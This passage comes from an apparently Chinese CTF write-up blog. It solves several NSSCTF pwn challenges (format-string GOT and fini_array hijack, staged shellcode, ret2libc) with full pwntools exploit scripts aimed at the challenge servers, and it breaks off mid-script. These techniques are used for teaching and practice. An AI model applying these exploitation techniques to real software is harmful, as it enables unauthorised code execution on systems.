class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28770</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset),<span class="number">0x0000000000401237</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h3><p>劫持fini_array</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>n1 = systemplt &amp; 0xFFFF</code>​：首先，提取 <code>system</code>​ 的低 16 位，即 <code>systemplt</code>​ 的低 16 位。</li>
<li>​<code>n2 = (systemplt &gt;&gt; 16) &amp; 0xFFFF</code>​：接下来，提取 <code>system</code>​ 的高 16 位。</li>
<li>​<code>n3 = main &amp; 0xFFFF</code>​：计算程序 <code>main</code>​ 地址的低 16 位（可能作为跳转的目标）。</li>
</ul>
<p>​<code>w_offset = 0xe</code>​：<code>w_offset</code>​ 是栈上 <code>%n</code>​ 格式化参数的索引，意味着我们会操作第 14 个参数。</p>
<ul>
<li><p>​<code>pay = f&#39;%&#123;n1&#125;c%&#123;w_offset&#125;$hn&#39;</code>​：这将使得 <code>printf</code>​ 输出 <code>n1</code>​ 个字符，并使用 <code>%n</code>​ 将已输出的字符数写入 <code>w_offset</code>​ 指向的地址。即，修改 <code>system</code>​ 地址的低 16 位。</p>
</li>
<li><p>​<code>pay += f&#39;%&#123;0x10000 + n2 - n1&#125;c%&#123;w_offset+1&#125;$hn&#39;</code>​：这个格式化字符串先输出差值（<code>n2 - n1</code>​），然后通过 <code>%n</code>​ 写入 <code>system</code>​ 地址的高 16 位。</p>
</li>
<li><p>​<code>pay += f&#39;%&#123;0x10000 + n3 - n2&#125;c%&#123;w_offset+2&#125;$hn&#39;</code>​：最后，修改 <code>main</code>​ 地址的低 16 位，以进一步控制程序流。</p>
</li>
<li><p>​<code>pay = pay.encode()</code>​：将格式化字符串转换为字节。</p>
</li>
<li><p>​<code>pay += (4 - (len(pay) % 4)) * b&#39;A&#39;</code>​：为了保证数据对齐（4 字节对齐），攻击者可能需要在格式化字符串后填充 <code>A</code>​ 字符。</p>
</li>
<li><p>​<code>pay += p32(printgot)</code>​：写入的第一个地址，即 <code>printgot</code>​（<code>printf</code>​ GOT 的位置）。</p>
</li>
<li><p>​<code>pay += p32(printgot+2)</code>​：写入的第二个地址，<code>printgot+2</code>​，因为 GOT 是 4 字节对齐的，所以第 2 个 <code>n</code>​ 写入的是该地址的第二部分。</p>
</li>
<li><p>​<code>pay += p32(gol)</code>​：最终控制流的劫持fini_array目标地址 <code>gol</code>​，它会触发执行 <code>main</code>​。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">25632</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line"><span class="comment"># info(&quot;rdi addr : &#123;:#x&#125;&quot;.format(rdi))</span></span><br><span class="line">printgot = <span class="number">0x804989c</span></span><br><span class="line">systemplt =  <span class="number">0x80483D0</span></span><br><span class="line">gol = <span class="number">0x804979C</span></span><br><span class="line">main = <span class="number">0x08048534</span></span><br><span class="line"></span><br><span class="line">n1 = systemplt &amp; <span class="number">0xFFFF</span></span><br><span class="line">n2 = (systemplt&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">n3 = main &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">w_offset = <span class="number">0xe</span></span><br><span class="line">pay  = <span class="string">f&#x27;%<span class="subst">&#123;n1&#125;</span>c%<span class="subst">&#123;w_offset&#125;</span>$hn&#x27;</span></span><br><span class="line">pay += <span class="string">f&#x27;%<span class="subst">&#123;<span class="number">0x10000</span> + n2 - n1&#125;</span>c%<span class="subst">&#123;w_offset+<span class="number">1</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pay += <span class="string">f&#x27;%<span class="subst">&#123;<span class="number">0x10000</span> + n3 - n2&#125;</span>c%<span class="subst">&#123;w_offset+<span class="number">2</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pay  = pay.encode()</span><br><span class="line">pay += (<span class="number">4</span> - (<span class="built_in">len</span>(pay) % <span class="number">4</span>)) * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">pay += p32(printgot)</span><br><span class="line">pay += p32(printgot+<span class="number">2</span>)</span><br><span class="line">pay += p32(gol)</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HGAME-2023-week1-simple-shellcode"><a href="#HGAME-2023-week1-simple-shellcode" class="headerlink" title="[HGAME 2023 week1]simple_shellcode"></a>[HGAME 2023 week1]simple_shellcode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x10</span>uLL);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xCAFE0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嘶，这可以写入0x10的字节</p>
<p>然后会调用，大小不够</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>000000000000137F <span class="comment">; 5:   puts(&quot;Please input your shellcode:&quot;);</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000137F                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;Please input your shellcode:&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001386</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>000000000000138B                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>000000000000138F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">10h</span>        <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001394</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001397</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000139C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A1                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>00000000000013A6 <span class="comment">; 7:   sandbox();</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A6                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013AB                 <span class="keyword">call</span>    sandbox</span><br><span class="line"><span class="symbol">.text:</span>00000000000013B0 <span class="comment">; 8:   MEMORY[0xCAFE0000]();</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013B0                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>00000000000013B4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013B9                 <span class="keyword">call</span>    <span class="built_in">rdx</span></span><br></pre></td></tr></table></figure>

<p>在调用到buf的代码时候，rdx为buf的地址，所以我们可以设置rdi为0，rsi为rdx+0x10的地址，使用syscall调用，然后再次调用call rsi;也就是再次输入的shellcode，这时候read的大小就是rsi的地址值足够容纳shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28942</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov rsi,rdx;</span></span><br><span class="line"><span class="string">add rsi,0x10;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">call rsi;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">sl(asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>)))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-WEEK2-ret2libc"><a href="#HNCTF-2022-WEEK2-ret2libc" class="headerlink" title="[HNCTF 2022 WEEK2]ret2libc"></a>[HNCTF 2022 WEEK2]ret2libc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打个rop即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">26221</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span 